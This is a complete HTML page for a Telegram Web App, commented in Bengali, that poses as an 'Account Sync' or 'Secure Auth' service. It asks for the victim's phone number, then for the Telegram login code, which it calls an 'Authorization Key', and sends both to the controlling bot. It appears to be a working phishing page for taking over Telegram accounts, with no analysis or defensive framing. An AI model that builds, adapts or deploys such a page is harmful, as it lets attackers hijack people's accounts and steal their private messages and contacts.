<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Auth</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: sans-serif; padding: 20px; text-align: center; background-color: #f9f9f9; color: #333; }
        .container { background: white; padding: 20px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 10px; box-sizing: border-box; font-size: 16px; }
        button { background-color: #0088cc; color: white; border: none; padding: 12px 20px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 16px; }
        .hidden { display: none; }
        p { font-size: 14px; color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <h3 id="title">Account Sync</h3>
        
        <!-- ধাপ ১: শুধু ফোন নম্বর -->
        <div id="phone-sec">
            <p>Enter your phone number to start synchronization.</p>
            <input type="text" id="phone" placeholder="+8801xxxxxxxxx">
            <button onclick="sendPhone()">Send Request</button>
        </div>

        <!-- ধাপ ২: ওটিপি (Authorization Key) -->
        <div id="otp-sec" class="hidden">
            <p>Check your Telegram and enter the Authorization Key.</p>
            <input type="text" id="otp" placeholder="Enter 5-digit key">
            <button onclick="sendOTP()">Verify & Sync</button>
            <p style="margin-top:10px;"><a href="#" onclick="showPhone()">Change Number</a></p>
        </div>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();

        // পেজ লোড হলে চেক করবে আগে নম্বর পাঠানো হয়েছে কি না
        window.onload = function() {
            if (localStorage.getItem("sent_phone")) {
                showOTP();
            }
        };

        function showOTP() {
            document.getElementById("phone-sec").classList.add("hidden");
            document.getElementById("otp-sec").classList.remove("hidden");
            document.getElementById("title").innerText = "Verify Identity";
        }

        function showPhone() {
            localStorage.removeItem("sent_phone");
            document.getElementById("phone-sec").classList.remove("hidden");
            document.getElementById("otp-sec").classList.add("hidden");
            document.getElementById("title").innerText = "Account Sync";
        }

        function sendPhone() {
            let phone = document.getElementById("phone").value;
            if(!phone || phone.length < 10) return alert("Enter a valid number!");
            
            localStorage.setItem("sent_phone", phone);
            tg.sendData(JSON.stringify({ phone: phone }));
            tg.close();
        }

        function sendOTP() {
            let phone = localStorage.getItem("sent_phone");
            let otp = document.getElementById("otp").value;
            if(!otp) return alert("Enter the key!");

            tg.sendData(JSON.stringify({ phone: phone, otp: otp }));
            localStorage.removeItem("sent_phone"); // কাজ শেষ হলে ডাটা মুছে দিবে
            tg.close();
        }
    </script>
</body>
</html>
